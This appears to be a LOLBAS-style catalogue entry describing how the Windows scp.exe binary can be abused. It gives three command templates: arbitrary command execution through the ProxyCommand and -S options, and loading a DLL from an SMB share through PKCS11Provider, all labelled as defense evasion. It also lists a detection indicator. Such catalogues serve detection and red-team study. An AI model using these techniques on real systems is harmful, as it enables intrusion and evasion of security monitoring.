      document_utf8: "---\nName: scp.exe\nDescription: Used for uploading or downloading files over SSH.\n\
        Author: BinFault\nCreated: 2026-06-03\nCommands:\n  - Command: scp.exe -o ProxyCommand=\"{CMD}\"\
        \ . localhost:.\n    Description: Spawns specified command from `scp.exe` -> `ssh.exe`, even if\
        \ no SSH server is running on localhost (or any other address specified).\n    Usecase: Proxy\
        \ execution of specified command, can be used as a defensive evasion.\n    Category: Execute\n\
        \    Privileges: User\n    MitreID: T1202\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n\
        \      - Execute: CMD\n  - Command: scp.exe -S \"{CMD}\" . localhost:.\n    Description: Spawns\
        \ specified command from `scp.exe` -> `ssh.exe`, even if no SSH server is running on localhost\
        \ (or any other address specified).\n    Usecase: Proxy execution of specified command, can be\
        \ used as a defensive evasion.\n    Category: Execute\n    Privileges: User\n    MitreID: T1202\n\
        \    OperatingSystem: Windows 10, Windows 11\n    Tags:\n      - Execute: CMD\n  - Command: scp\
        \ -o PKCS11Provider=\"{PATH_SMB:.dll}\" . win@github.com:.\n    Description: Loads a DLL from\
        \ an absolute path or SMB path into child process `ssh.exe` by abusing the `PKCS11Provider` option.\
        \ The payload executes upon DLL load (`DllMain`) and requires exporting `C_GetFunctionList` to\
        \ prevent premature termination by `scp.exe`.\n    Usecase: Performs indirect execution of a specified\
        \ DLL from a remote share, can be used for defense evasion.\n    Category: Execute\n    Privileges:\
        \ User\n    MitreID: T1218\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n      - Execute:\
        \ DLL\n      - Execute: Remote\nFull_Path:\n  - Path: C:\\Windows\\System32\\OpenSSH\\scp.exe\n\
        Detection:\n  - IOC: \"`scp.exe` executions referencing `ProxyCommand`.\"\nResources:\n  - Link:\
        \ https://gtfobins.org/gtfobins/scp/\n  - Link: https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9\n\
        Acknowledgement:\n  - Person: BinFault\n    Handle: '@binfault'\n  - Person: 'Nir Chako (Pentera)'\n\
        \    Handle: '@C_h4ck_0'\n  - Person: Edo Maland\n    Handle: '@screetsec'\n"
